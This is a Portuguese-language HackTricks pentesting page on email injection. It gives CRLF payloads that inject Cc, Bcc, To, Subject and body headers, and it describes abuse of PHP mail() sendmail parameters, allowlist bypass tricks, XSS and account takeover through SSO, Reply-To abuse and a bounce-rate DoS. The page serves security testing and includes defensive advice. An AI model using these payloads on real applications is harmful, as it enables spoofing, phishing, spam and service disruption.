# Inje√ß√µes de Email

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o reposit√≥rio** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injetar em e-mail enviado

### Injetar Cc e Bcc ap√≥s o argumento do remetente
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
A mensagem ser√° enviada para as contas do destinat√°rio e destinat√°rio1.

### Injetar argumento
```
From:sender@domain.com%0ATo:attacker@domain.com
```
A mensagem ser√° enviada para o destinat√°rio original e para a conta do atacante.

### Injetar argumento de Assunto
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
O assunto falso ser√° adicionado ao assunto original e, em alguns casos, o substituir√°. Isso depende do comportamento do servi√ßo de e-mail.

### Alterar o corpo da mensagem

Injete uma quebra de linha de duas linhas e, em seguida, escreva sua mensagem para alterar o corpo da mensagem.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### Explora√ß√£o da fun√ß√£o mail() do PHP

A fun√ß√£o `mail()` do PHP √© comumente usada para enviar e-mails a partir de um servidor web. No entanto, ela tamb√©m pode ser explorada por hackers para realizar ataques de inje√ß√£o de e-mail.

#### O que √© uma inje√ß√£o de e-mail?

Uma inje√ß√£o de e-mail ocorre quando um invasor consegue inserir c√≥digo malicioso em um campo de entrada de e-mail, explorando uma falha de seguran√ßa no c√≥digo do aplicativo. Isso pode permitir que o invasor envie e-mails n√£o autorizados, falsifique remetentes ou execute outras a√ß√µes maliciosas.

#### Como explorar a fun√ß√£o mail() do PHP?

Para explorar a fun√ß√£o `mail()` do PHP, um invasor precisa encontrar um campo de entrada de e-mail vulner√°vel em um aplicativo da web. Isso pode ser um campo de formul√°rio de contato, um campo de registro de usu√°rio ou qualquer outro campo que aceite endere√ßos de e-mail.

Uma vez identificado o campo vulner√°vel, o invasor pode inserir c√≥digo malicioso para explorar a fun√ß√£o `mail()`. Isso pode ser feito inserindo caracteres especiais, como aspas, ponto e v√≠rgula ou caracteres de escape, que podem enganar o c√≥digo do aplicativo e permitir a execu√ß√£o de comandos indesejados.

#### Impactos de uma inje√ß√£o de e-mail bem-sucedida

Uma inje√ß√£o de e-mail bem-sucedida pode ter v√°rias consequ√™ncias negativas, incluindo:

- Envio de spam em massa a partir do servidor comprometido.
- Falsifica√ß√£o de remetentes para realizar ataques de phishing.
- Vazamento de informa√ß√µes confidenciais por meio de e-mails n√£o autorizados.
- Execu√ß√£o de comandos maliciosos no servidor.

#### Como se proteger contra inje√ß√µes de e-mail?

Para proteger um aplicativo da web contra inje√ß√µes de e-mail, √© importante seguir as melhores pr√°ticas de seguran√ßa, como:

- Validar e filtrar todas as entradas de usu√°rio, especialmente campos de e-mail.
- Utilizar fun√ß√µes de escape adequadas para evitar a interpreta√ß√£o incorreta de caracteres especiais.
- Implementar mecanismos de autentica√ß√£o e autoriza√ß√£o para controlar o envio de e-mails.
- Manter o software do servidor e as bibliotecas atualizados para corrigir quaisquer vulnerabilidades conhecidas.

Ao adotar essas pr√°ticas, √© poss√≠vel reduzir significativamente o risco de uma inje√ß√£o de e-mail bem-sucedida e proteger o aplicativo contra ataques maliciosos.
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### O 5¬∫ par√¢metro ($additional\_parameters)

Esta se√ß√£o ser√° baseada em **como abusar deste par√¢metro supondo que um atacante o controle**.

Este par√¢metro ser√° adicionado √† linha de comando que o PHP usar√° para invocar o bin√°rio sendmail. No entanto, ele ser√° sanitizado com a fun√ß√£o `escapeshellcmd($additional_parameters)`.

Um atacante pode **injetar par√¢metros extras para o sendmail** neste caso.

#### Diferen√ßas na implementa√ß√£o de /usr/sbin/sendmail

A interface **sendmail** √© **fornecida pelo software de e-mail MTA** (Sendmail, Postfix, Exim etc.) instalado no sistema. Embora a **funcionalidade b√°sica** (como os par√¢metros -t -i -f) permane√ßa a **mesma** por raz√µes de compatibilidade, **outras fun√ß√µes e par√¢metros** variam muito dependendo do MTA instalado.

Aqui est√£o alguns exemplos de diferentes p√°ginas de manual do comando/interface sendmail:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Dependendo da **origem do bin√°rio sendmail**, diferentes op√ß√µes foram descobertas para abusar deles e **vazar arquivos ou at√© mesmo executar comandos arbitr√°rios**. Veja como em [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## Injetar no nome do e-mail

### Partes ignoradas de um e-mail

Os s√≠mbolos: **+, -** e **{}** em raras ocasi√µes podem ser usados para marca√ß√£o e ignorados pela maioria dos servidores de e-mail

* Por exemplo: john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Coment√°rios entre par√™nteses ()** no in√≠cio ou no final tamb√©m ser√£o ignorados

* Por exemplo: john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Bypass da lista de permiss√µes

<figure><img src="../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>

### Aspas

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### IPs

Voc√™ tamb√©m pode usar IPs como nomes de dom√≠nio entre colchetes:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Outras vulnerabilidades

![](<../.gitbook/assets/image (296).png>)

## SSO de terceiros

### XSS

Alguns servi√ßos como **github** ou **salesforce permitem** que voc√™ crie um **endere√ßo de e-mail com payloads XSS**. Se voc√™ puder **usar esses provedores para fazer login em outros servi√ßos** e esses servi√ßos **n√£o estiverem sanitizando** corretamente o e-mail, voc√™ poder√° causar **XSS**.

### Account-Takeover

Se um **servi√ßo SSO** permitir que voc√™ **crie uma conta sem verificar o endere√ßo de e-mail fornecido** (como **salesforce**) e depois voc√™ pode usar essa conta para **fazer login em um servi√ßo diferente** que **confia** no salesforce, voc√™ poder√° acessar qualquer conta.\
Observe que o salesforce indica se o e-mail fornecido foi ou n√£o verificado, mas a aplica√ß√£o deve levar em conta essa informa√ß√£o.

## Reply-To

Voc√™ pode enviar um e-mail usando _**From: company.com**_\*\* \*\* e _**Replay-To: attacker.com**_ e se alguma **resposta autom√°tica** for enviada devido ao e-mail ter sido enviado **de** um **endere√ßo interno**, o **atacante** pode ser capaz de **receber** essa **resposta**.

## Taxa de rejei√ß√£o permanente

Algumas aplica√ß√µes como a AWS t√™m uma **Taxa de Rejei√ß√£o Permanente** (na AWS √© de 10%), que quando sobrecarregada, o servi√ßo de e-mail √© bloqueado.

Uma **rejei√ß√£o permanente** √© um **e-mail** que n√£o p√¥de ser entregue por algum motivo permanente. Talvez o **e-mail** seja um endere√ßo falso, talvez o dom√≠nio do **e-mail** n√£o seja um dom√≠nio real, ou talvez o servidor do destinat√°rio do **e-mail** n√£o aceite **e-mails**), isso significa que de um total de 1000 e-mails, se 100 deles forem falsos ou inv√°lidos e causarem o retorno de todos eles, o **AWS SES** bloquear√° seu servi√ßo.

Portanto, se voc√™ puder **enviar e-mails (talvez convites) do aplicativo da web para qualquer endere√ßo de e-mail**, voc√™ pode provocar esse bloqueio enviando centenas de convites para usu√°rios e dom√≠nios inexistentes: DoS do servi√ßo de e-mail.

## Refer√™ncias

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, utilizando as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
